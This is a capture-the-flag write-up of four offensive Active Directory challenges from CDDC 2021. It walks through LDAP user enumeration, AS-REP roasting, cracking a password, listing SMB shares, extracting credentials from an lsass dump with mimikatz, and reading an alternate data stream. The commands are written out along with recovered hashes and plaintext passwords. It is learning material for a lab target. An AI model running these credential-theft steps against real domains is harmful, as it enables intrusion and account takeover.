## [Up 1 directory](../CDDC_2021.md)
  
# Behind The Mask

This was a series of offensive Active Directory challenges hosted during CDDC 2021.
The challenges must be solved in order.

## Challenge #1: Light  
### Points: 200
### Challenge Text:  
It’s time to expose the GDC! We have successfully obtained the IP address of their AD server.   
First, try to list the different users that are configured on the server.  
  
### Solution  
The list of users from the DC can be obtained with the following command:  
```
ldapsearch -LLL -x -H ldap://18.136.74.102 -b ‘DC=gdc,DC=local' > enumAD.txt
```  
The flag is in the description for one of the users. I just opened the enumAD.txt file and
ctrl+F'ed for the flag format.  
  
![flag](./Behind_The_Mask/light.png)

## Challenge #2: Get a Ticket
### Points: 300
### Challenge Text:  
We must find a way to access the shared folders configured on this server. I don’t see anyway, but maybe you can figure it out…
  
### Solution  
Since these challenges are locked in order, I assume that each challenge is dependant on the solution to the
previous one. Since the previous challenge was to get a list of users, I originally assumed the solution was to
find a service account and kerberoast it.  
  
However, no accounts vulnerable to kerberoasting were found. We eventually solved the challenge by ASREP-Roast-ing user accounts
found in the previous challenge for kerberos tickets. The following command was used:

python GetNPUsers.py gdc.local/ -usersfile usernames.txt -format hashcat -outputfile tickets.txt
  
![tickets](./Behind_The_Mask/tickets.png)
  
Kerberos tickets for the user liam.a were obtained. The tickets were roasted and the password for liam.a was obtained.  

![cracked](./Behind_The_Mask/cracked.png)
  
Using the password p@ssw0rd and the user liam.a, I listed the network shares.

```
smbclient -L //18.136.74.102/ -U liam.a
Enter WORKGROUP\liam.a's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin                                                                                                                                                                      
        Backup          Disk                                                                                                                                                                                        
        C$              Disk      Default share                                                                                                                                                                     
        Forensics       Disk                                                                                                                                                                                        
        IPC$            IPC       Remote IPC                                                                                                                                                                        
        Mission2 Flag   Disk                                                                                                                                                                                        
        NETLOGON        Disk      Logon server share                                                                                                                                                                
        SYSVOL          Disk      Logon server share  


smbclient //18.136.74.102/Mission2\ Flag -U liam.a  
...
cat flag.txt  
CDDC21{4S_REP_R0A$T}
```  
Flag obtained!

## Challenge #3: Old Memories
### Points: 300
### Challenge Text:  
(original challenge text was forgotten :( but it talked about a memory dump in the DC)
  
### Solution  
Since the challenge text talked about a memory dump in the DC, I enumerated the shares I could access  
using liam.a and found the "Forensics" share which contained a file named lsass.dmp. This was obviously  
a dump of the lsass.exe process, which windows uses to store credentials. Mimikatz was used to extract  
credentials (and the flag).  

```
PS C:\Users\User\Desktop\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::minidump lsass.DMP
Switch to MINIDUMP : 'lsass.DMP'

mimikatz # sekurlsa::logonpasswords
```  
  
2 sets of interesting credentials were recovered.  
```
Authentication Id : 0 ; 920378 (00000000:000e0b3a)
Session           : Interactive from 2
User Name         : Flag
Domain            : DESKTOP-2QFHHML
Logon Server      : DESKTOP-2QFHHML
Logon Time        : 6/10/2021 2:51:50 PM
SID               : S-1-5-21-2198713953-2006436724-2838398043-1002
        msv :
         [00000005] Primary
         * Username : Flag
         * Domain   : DESKTOP-2QFHHML
         * NTLM     : 596c4994f88d93d0718bdea487092f11
         * SHA1     : 45b9d6c67c871a7c763e3a062c8e0684415e6834
        tspkg :
        wdigest :
         * Username : Flag
         * Domain   : DESKTOP-2QFHHML
         * Password : CDDC21{lsa$$_DUMP_password}
        kerberos :
         * Username : Flag
         * Domain   : DESKTOP-2QFHHML
         * Password : (null)
        ssp :
        credman :
  
... 

Authentication Id : 0 ; 195020 (00000000:0002f9cc)
Session           : Interactive from 1
User Name         : John
Domain            : DESKTOP-2QFHHML
Logon Server      : DESKTOP-2QFHHML
Logon Time        : 6/10/2021 2:44:43 PM
SID               : S-1-5-21-2198713953-2006436724-2838398043-1001
        msv :
         [00000005] Primary
         * Username : John
         * Domain   : DESKTOP-2QFHHML
         * NTLM     : 53bb900f229aa32d546f54523a96de67
         * SHA1     : 1075eeefce15aa2008f2e0594babccc09cdf5d4b
        tspkg :
        wdigest :
         * Username : John
         * Domain   : DESKTOP-2QFHHML
         * Password : #johnIStheBEST!
        kerberos :
         * Username : John
         * Domain   : DESKTOP-2QFHHML
         * Password : (null)
        ssp :
        credman :
```  
  
The first password was the flag, but there was also a second password to a user named John. Lets save that for later.  

## Challenge #4: Alternate Way
### Points: 500
### Challenge Text:  
You’re doing great! We almost there, but we need to find a way to take control of this server. What about the backup folder?
  
### Solution  
The backup folder was not accessible by the user liam.a. At first, I authenticated to the share  
using the credentials for the "John" user discovered in the memory dump.  
  
The share contained a file named "creds.txt", which was an empty file. After quite a while trying  
to figure out if the box had been tampered with (again), I used the "allinfo" command in smbclient  
to see if there were any Alternate Data Streams, since the challenge name was "Alternate Way", which  
was hinting at an ADS. Sure enough, there was the flag!

```
cat creds.txt_flag.txt_$DATA
CDDC21{An0the4_STREAM!} 
```

  
  



  
